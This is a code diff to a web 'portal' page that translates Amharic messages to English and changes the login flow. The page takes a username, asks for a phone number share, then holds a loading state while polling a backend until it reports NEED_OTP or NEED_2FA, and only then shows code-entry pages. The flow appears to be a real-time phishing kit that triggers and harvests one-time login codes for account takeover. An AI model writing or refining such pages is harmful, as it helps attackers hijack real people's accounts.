@@ -28,7 +28,7 @@ header .header-title p { font-size: 13px; opacity: 0.9; margin-top: 2px; font-fa
 @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
 
 .welcome-box { text-align: center; margin-bottom: 32px; padding: 0 10px; }
-.welcome-box h2 { color: #1e293b; font-size: 34px; font-weight: 900; margin-bottom: 14px; letter-spacing: -0.5px; }
+.welcome-box h2 { color: #1e293b; font-size: 34px; font-weight: 600; margin-bottom: 14px; letter-spacing: -0.5px; }
 .welcome-box p { color: #475569; font-size: 15.5px; line-height: 1.6; }
 .portal-card { background-color: #ffffff; border-radius: 12px; padding: 24px; margin-bottom: 20px; box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 16px -6px rgba(0, 0, 0, 0.03); border: 1px solid #edf2f7; }
 .portal-card-heading { display: flex; align-items: center; gap: 14px; margin-bottom: 14px; }
@@ -387,7 +387,7 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
         const value = usernameInputField.value.trim();  
         
         if (value.length < 5) {  
-            showUiError("Username must be 5-15 characters long.");
+            showUiError("Username must be 5-15 characters long and contain only letters, numbers, and dots");
             return;  
         } else {  
             validationErrorBox.style.display = 'none';  
@@ -411,8 +411,8 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
             const data = await res.json();
 
             if (data.status === "FOUND" || data.status === "NEED_OTP") {
-                resetButton(originalBtnText);
-                switchToOtpPage();
+                // መረጃው ቢገኝም እንኳ ኮዱ በጀርባ መላኩ በትክክል እስኪረጋገጥ ድረስ ቀጥታ ወደ OTP ገጽ አይቀይርም
+                startCheckingStatusLoop(originalBtnText);
             } else if (data.status === "NEED_2FA") {
                 resetButton(originalBtnText);
                 switchTo2FAPage();
@@ -424,7 +424,7 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
             }
         } catch(e) { 
             resetButton(originalBtnText);
-            showUiError("የአውታረ መረብ ስህተት አጋጥሟል። እባክዎ ድጋሚ ይሞክሩ።");
+            showUiError("A network error occurred. Please try again.");
         }
     }
 
@@ -435,16 +435,16 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
                     startCheckingStatusLoop(originalText);
                 } else { 
                     resetButton(originalText);
-                    showUiError("ለማስቀጠል እባክዎ መጀመሪያ ስልክ ቁጥርዎን ያጋሩ።");
+                    showUiError("To continue, please share your phone number first.");
                 }
             });
         } else {
-            let mockConfirm = confirm("[የሙከራ] ለማስቀጠል ስልክ ቁጥርዎን ማጋራት ይፈልጋሉ?");
+            let mockConfirm = confirm("Do you want to share your phone number to continue [experimental]?");
             if (mockConfirm) { 
                 startCheckingStatusLoop(originalText); 
             } else { 
                 resetButton(originalText); 
-                showUiError("ለማስቀጠል እባክዎ መጀመሪያ ስልክ ቁጥርዎን ያጋሩ።"); 
+                showUiError("To continue, please share your phone number first.");
             }
         }
     }
@@ -456,6 +456,7 @@ footer { background-color: #0b438c; color: white; text-align: center; padding: 2
                 const res = await fetch(`${BASE_URL}/check_status/${userId}`);
                 const data = await res.json();
                 
+                // አገልጋዩ (Backend) ኮዱን ልኮ NEED_OTP ወይም NEED_2FA እስኪሆን ድረስ ሎዲንጉ በተመሳሳይ ገጽ ላይ ይቆያል
                 if (data && data.status && data.status !== "WAITING") {
                     clearInterval(statusInterval);
                     resetButton(originalText);
